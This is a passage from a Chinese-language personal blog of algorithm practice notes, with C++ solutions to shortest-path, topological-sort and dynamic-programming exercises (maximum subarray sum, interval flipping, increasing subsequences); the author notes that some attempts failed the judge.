<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">edge</span>&#123;</span><br><span class="line">	<span class="type">int</span> u, v, w;</span><br><span class="line">	<span class="built_in">edge</span>(<span class="type">int</span> u_, <span class="type">int</span> v_, <span class="type">int</span> w_)&#123;</span><br><span class="line">		u = u_;</span><br><span class="line">		v = v_;</span><br><span class="line">		w = w_;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vector&lt;edge&gt; edges; </span><br><span class="line">vector&lt;<span class="type">int</span>&gt; gra[maxn];</span><br><span class="line"><span class="type">int</span> vis[maxn];</span><br><span class="line"><span class="type">int</span> dis[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	edges.<span class="built_in">clear</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line">		dis[i] = maxn;</span><br><span class="line">		vis[i] = <span class="number">0</span>;</span><br><span class="line">		gra[i].<span class="built_in">clear</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">spfa</span><span class="params">(<span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">	dis[s] = <span class="number">0</span>;</span><br><span class="line">	priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">	q.<span class="built_in">push</span>(s);</span><br><span class="line"><span class="comment">//	vis[s] = 1;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">		<span class="type">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		vis[now] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//		cout &lt;&lt; now &lt;&lt; endl;</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; gra[now].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">			edge e = edges[gra[now][i]];</span><br><span class="line"><span class="comment">//			cout &lt;&lt; e.u &lt;&lt; e.v &lt;&lt; e.w &lt;&lt; dis[e.v]&lt;&lt; endl;</span></span><br><span class="line">			<span class="keyword">if</span>(dis[e.v] &gt; dis[now] + e.w)&#123;</span><br><span class="line">				dis[e.v] = dis[now] + e.w;</span><br><span class="line">				<span class="keyword">if</span>(!vis[e.v])&#123;</span><br><span class="line">					vis[e.v] = <span class="number">1</span>;</span><br><span class="line">					q.<span class="built_in">push</span>(e.v);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addedge</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span>&#123;</span><br><span class="line">	edges.<span class="built_in">push_back</span>(<span class="built_in">edge</span>(a, b, c));</span><br><span class="line">	<span class="type">int</span> sz = edges.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">	gra[a].<span class="built_in">push_back</span>(sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">init</span>();</span><br><span class="line"><span class="comment">//		cout &lt;&lt; dis[2] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;初始化完毕&quot; &lt;&lt; endl;</span></span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">			<span class="built_in">addedge</span>(a, b, c);</span><br><span class="line">			<span class="built_in">addedge</span>(b, a, c); </span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;读取数据完毕&quot; &lt;&lt; endl;</span></span><br><span class="line">		<span class="built_in">spfa</span>(<span class="number">1</span>);</span><br><span class="line">		cout &lt;&lt; dis[n] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>floyd全源最短路径也过不了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX = <span class="number">0x3f3f</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="type">int</span> gra[maxn][maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="keyword">if</span>(m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i == j) gra[i][j] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">else</span> gra[i][j] = MAX;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> a, b, c;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">			<span class="keyword">if</span>(c &lt; gra[a][b])&#123;</span><br><span class="line">				gra[a][b] = c;</span><br><span class="line">				gra[b][a] = c;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">1</span>; k &lt;= n; k++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(gra[k][i] == MAX &amp;&amp; gra[i][j] == MAX) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span>(gra[k][j] == MAX || gra[k][j] &gt; gra[k][i] + gra[i][j])&#123;</span><br><span class="line">						gra[k][j] = gra[k][i] + gra[i][j];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; gra[<span class="number">1</span>][n] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="确定比赛名次">确定比赛名次</h3>
<h5 id="题目描述-37">题目描述</h5>
<p>有N个比赛队（1&lt;=N&lt;=500），编号依次为1，2，3，。。。。，N进行比赛，比赛结束后，裁判委员会要将所有参赛队伍从前往后依次排名，但现在裁判委员会不能直接获得每个队的比赛成绩，只知道每场比赛的结果，即P1赢P2，用P1，P2表示，排名时P1在P2之前。现在请你编程序确定排名。</p>
<h5 id="输入输出格式-35">输入输出格式</h5>
<h6 id="输入描述-37">输入描述:</h6>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">输入有若干组，每组中的第一行为二个数N（<span class="number">1</span>&lt;<span class="symbol">=N</span>&lt;<span class="number">=500</span>），M；其中N表示队伍的个数，M表示接着有M行的输入数据。接下来的M行数据中，每行也有两个整数<span class="built_in">P1</span>，<span class="built_in">P2</span>表示即<span class="built_in">P1</span>队赢了<span class="built_in">P2</span>队。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-37">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">给出一个符合要求的排名。输出时队伍号之间有空格，最后一名后面没有空格。</span><br><span class="line"></span><br><span class="line">其他说明：符合条件的排名可能不是唯一的，此时要求输出时编号小的队伍在前；输入数据保证是正确的，即输入数据确保一定能有一个符合要求的排名。</span><br></pre></td></tr></table></figure>
<p>拓扑排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">505</span>;</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"><span class="type">int</span> mpt[maxn][maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">toposort</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">	priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt; &gt; q;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(d[i] == <span class="number">0</span>) q.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">		<span class="type">int</span> now = q.<span class="built_in">top</span>();</span><br><span class="line">		ans.<span class="built_in">push_back</span>(now);</span><br><span class="line">		q.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(mpt[now][i] == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(--d[i] == <span class="number">0</span>)&#123;</span><br><span class="line">					q.<span class="built_in">push</span>(i);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; m)&#123;</span><br><span class="line">		<span class="type">int</span> a, b;</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="built_in">memset</span>(mpt, <span class="number">0</span>, <span class="built_in">sizeof</span>(mpt));</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">			<span class="keyword">if</span>(mpt[a][b] == <span class="number">0</span>)&#123;</span><br><span class="line">				mpt[a][b] = <span class="number">1</span>;</span><br><span class="line">				d[b]++;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; ans = <span class="built_in">toposort</span>(n);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">			cout &lt;&lt; ans[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h1 id="动态规划">动态规划</h1>
<p>分而治之</p>
<p>最后一章了！</p>
<h2 id="递推">递推</h2>
<p>比较重要的就是斐波那契数列了，f[n] = f[n-1] + f[n-2]</p>
<h2 id="最大字段和">最大字段和</h2>
<h3 id="最大序列和">最大序列和</h3>
<h5 id="题目描述-38">题目描述</h5>
<p>给出一个整数序列S，其中有N个数，定义其中一个非空连续子序列T中所有数的和为T的“序列和”。
对于S的所有非空连续子序列T，求最大的序列和。
变量条件：N为正整数，N≤1000000，结果序列和在范围（-2<sup>63,2</sup>63-1）以内。</p>
<h5 id="输入输出格式-36">输入输出格式</h5>
<h6 id="输入描述-38">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">第一行为一个正整数<span class="built_in">N</span>，第二行为<span class="built_in">N</span>个整数，表示序列中的数。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-38">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输入可能包括多组数据，对于每一组输入数据，</span><br><span class="line">仅输出一个数，表示最大序列和。</span><br></pre></td></tr></table></figure>
<p>范围比较大，要初始化longlong</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a[<span class="number">1000005</span>], d[<span class="number">1000005</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> maxx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">		maxx = a[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">			d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">			maxx = <span class="built_in">max</span>(maxx, d[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; maxx &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="字符串区间翻转">字符串区间翻转</h3>
<h5 id="题目描述-39">题目描述</h5>
<p>小诺有一个由0和1组成的字符串
现在小诺有一次机会，可以选择一个任意的区间[L,R]，将该区间内的所有字符串进行翻转(即0-&gt;1,1-&gt;0)。
请问小诺经过一次翻转之后字符串中最多会有多少个1？</p>
<h5 id="输入输出格式-37">输入输出格式</h5>
<h6 id="输入描述-39">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">第一行输入一个正整数<span class="built_in">n</span>，表示字符串长度，<span class="built_in">n</span>&lt;=<span class="number">10</span>^<span class="number">7</span>。 </span><br><span class="line">接下来一行一个输入一个<span class="number">01</span>字符串。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-39">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输出题目要求的答案。</span><br></pre></td></tr></table></figure>
<p>最大连续子串可以映射到最大序列和问题，这题要找最多0的个数，把0变成1，1变成-1，那就是标准的最大连续序列和了；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[<span class="number">10000005</span>];</span><br><span class="line"><span class="type">int</span> d[<span class="number">10000005</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	string s;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		cin &gt;&gt; s;</span><br><span class="line">		<span class="type">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">				a[i] = <span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				a[i] = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			d[i] = <span class="built_in">max</span>(d[i<span class="number">-1</span>]+a[i], a[i]);</span><br><span class="line">			ans = <span class="built_in">max</span>(d[i], ans);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">				ans++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="最大连续子序列">最大连续子序列</h3>
<h5 id="题目描述-40">题目描述</h5>
<p>给定K个整数的序列{ N1, N2, ..., NK }，其任意连续子序列可表示为{ Ni,
Ni+1, ..., Nj }，其中 1 &lt;= i &lt;= j &lt;=
K。最大连续子序列是所有连续子序列中元素和最大的一个，例如给定序列{ -2,
11, -4, 13, -5, -2 }，其最大连续子序列为{ 11, -4, 13
}，最大和为20。现在增加一个要求，即还需要输出该子序列的第一个和最后一个元素。</p>
<h5 id="输入输出格式-38">输入输出格式</h5>
<h6 id="输入描述-40">输入描述:</h6>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">测试输入包含若干测试用例，每个测试用例占<span class="number">2</span>行，第<span class="number">1</span>行给出正整数<span class="built_in">K</span><span class="punctuation">(</span> <span class="built_in">K</span><span class="operator">&lt;</span> <span class="number">10000</span> <span class="punctuation">)</span>，第<span class="number">2</span>行给出<span class="built_in">K</span>个整数，中间用空格分隔。当<span class="built_in">K</span>为<span class="number">0</span>时，输入结束，该用例不被处理。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-40">输出描述:</h6>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">对每个测试用例，在<span class="number">1</span>行里输出最大和、最大连续子序列的第一个和最后一个元素，中间用空格分隔。如果最大连续子序列不唯一，则输出序号<span class="selector-tag">i</span>和j最小的那个（如输入样例的第<span class="number">2</span>、<span class="number">3</span>组）。若所有K个元素都是负数，则定义其最大和为<span class="number">0</span>，输出整个序列的首尾元素。</span><br></pre></td></tr></table></figure>
<p>主要是左右边界的判断，有人是只找最大子序列和的右边界，然后一直往前减减到0为止得到左边界，比较容易想到</p>
<p>如果要在得到最大子序列的时候得到左边界，需要满足的条件是d[i-1]小于0并且这一轮的d[i]要比现有子序列大（直接把前面算的子序列和舍弃掉）；右边界比较好找。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">10000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> a[maxn];</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">		<span class="built_in">memset</span>(d, <span class="number">0</span>, <span class="built_in">sizeof</span>(d));</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		d[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">		<span class="type">int</span> ans = a[<span class="number">0</span>], l = a[<span class="number">0</span>], r = a[<span class="number">0</span>], l_ = a[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(d[i<span class="number">-1</span>]+a[i] &lt; a[i])&#123;</span><br><span class="line">				d[i] = a[i];</span><br><span class="line">				l_ = a[i];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(ans &lt; d[i])&#123;</span><br><span class="line">				ans = d[i];</span><br><span class="line">				r = a[i];</span><br><span class="line">				l = l_;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans &lt; <span class="number">0</span>)&#123;</span><br><span class="line">			ans = <span class="number">0</span>;</span><br><span class="line">			l = a[<span class="number">0</span>];</span><br><span class="line">			r = a[n<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, ans, l, r);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="最大子串和">最大子串和</h3>
<h5 id="题目描述-41">题目描述</h5>
<p>输入n个整数的序列，求它的最大子串和，并输出对应的数。</p>
<h5 id="输入输出格式-39">输入输出格式</h5>
<h6 id="输入描述-41">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">多组测试数据。</span><br><span class="line">第一行输入一个整数<span class="built_in">n</span>（<span class="number">0</span>&lt;<span class="built_in">n</span>&lt;=<span class="number">100</span>）。</span><br><span class="line">接下来一行输入<span class="built_in">n</span>个数用空格隔开，保证每个数的绝对值小于<span class="number">1000</span>。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-41">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">第一行输出所求子串的序列，如果有多个答案，输出靠前的答案。</span><br><span class="line">第二行输出最大子串和。</span><br></pre></td></tr></table></figure>
<p>我是真服了，上一题的又过不了。</p>
<p>但这一题规模比较小，可以爆破。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="type">int</span> a[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;, d[n+<span class="number">5</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="type">int</span> max = <span class="number">-1e7</span>, l=<span class="number">0</span>, r=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; a[i];</span><br><span class="line">			d[i] = d[i<span class="number">-1</span>] + a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; i+j &lt;= n; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(d[i+j] - d[i<span class="number">-1</span>] &gt; max)&#123;</span><br><span class="line">					max = d[i+j] - d[i<span class="number">-1</span>];</span><br><span class="line">					l = i;</span><br><span class="line">					r = i+j;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = l; i &lt;= r; i++)&#123;</span><br><span class="line">			cout &lt;&lt; a[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="最长升序子序列">最长升序子序列</h2>
<p>一种n^2的做法，状态转移方程为<img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193604186.png" alt="image-20230702193604186"><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193713438.png" alt="image-20230702193713438"></p>
<p>还有一种基于二分和贪心的算法，为O(nlogn)</p>
<p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193732252.png" alt="image-20230702193732252"></p>
<p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230702193722637.png" alt="image-20230702193722637"></p>
<h3 id="最大上升子序列和">最大上升子序列和</h3>
<h5 id="题目描述-42">题目描述</h5>
<p>一个数的序列bi，当b1 &lt; b2 &lt; ... &lt;
bS的时候，我们称这个序列是上升的。对于给定的一个序列(a1, a2,
...,aN)，我们可以得到一些上升的子序列(ai1, ai2, ..., aiK)，这里1 &lt;=
i1 &lt; i2 &lt; ... &lt; iK &lt;= N。比如，对于序列(1, 7, 3, 5, 9, 4,
8)，有它的一些上升子序列，如(1, 7), (3, 4,
8)等等。这些子序列中序列和最大为18，为子序列(1, 3, 5, 9)的和.
你的任务，就是对于给定的序列，求出最大上升子序列和。注意，最长的上升子序列的和不一定是最大的，比如序列(100,
1, 2, 3)的最大上升子序列和为100，而最长上升子序列为(1, 2, 3)。</p>
<h5 id="输入输出格式-40">输入输出格式</h5>
<h6 id="输入描述-42">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入包含多组测试数据。</span><br><span class="line">每组测试数据由两行组成。第一行是序列的长度<span class="built_in">N</span> (<span class="number">1</span> &lt;= <span class="built_in">N</span> &lt;= <span class="number">1000</span>)。第二行给出序列中的<span class="built_in">N</span>个整数，这些整数的取值范围都在<span class="number">0</span>到<span class="number">10000</span>（可能重复）。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-42">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">对于每组测试数据，输出其最大上升子序列和。</span><br></pre></td></tr></table></figure>
<p>注意这题是最大上升子序列和，而不是最长上升子序列，直接dp遍历了</p>
